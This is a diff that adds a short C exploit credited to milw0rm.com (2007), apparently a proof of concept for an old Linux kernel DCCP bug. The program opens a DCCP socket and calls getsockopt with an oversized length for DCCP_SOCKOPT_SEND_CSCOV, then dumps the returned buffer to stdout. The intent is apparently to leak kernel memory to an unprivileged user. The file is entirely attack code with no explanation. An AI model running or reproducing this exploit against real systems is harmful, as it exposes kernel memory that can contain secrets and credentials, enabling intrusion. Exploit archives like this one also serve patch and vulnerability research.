@@ -1,0 +1,39 @@
+#include <netinet/in.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <sys/mman.h>
+#include <linux/net.h>
+
+#define BUFSIZE 0x10000000
+
+int main(int argc, char *argv[])
+{
+    void *mem = mmap(0, BUFSIZE, PROT_READ | PROT_WRITE,
+               MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
+    if (mem == (void*)-1) {
+       printf("Alloc failed\n");
+       return -1;
+    }
+    /* SOCK_DCCP, IPPROTO_DCCP */
+    int s = socket(PF_INET, 6, 33);
+    if (s == -1) {
+       fprintf(stderr, "socket failure!\n");
+       return 1;
+    }
+   /* SOL_DCCP, DCCP_SOCKOPT_SEND_CSCOV */
+    int len = BUFSIZE;
+    int x = getsockopt(s, 269, 11, mem, &len);
+
+    if (x == -1)
+       perror("SETSOCKOPT");
+    else
+       printf("SUCCESS\n");
+
+    write(1, mem, BUFSIZE);
+
+    return 0;
+}
+
+// milw0rm.com [2007-03-28]
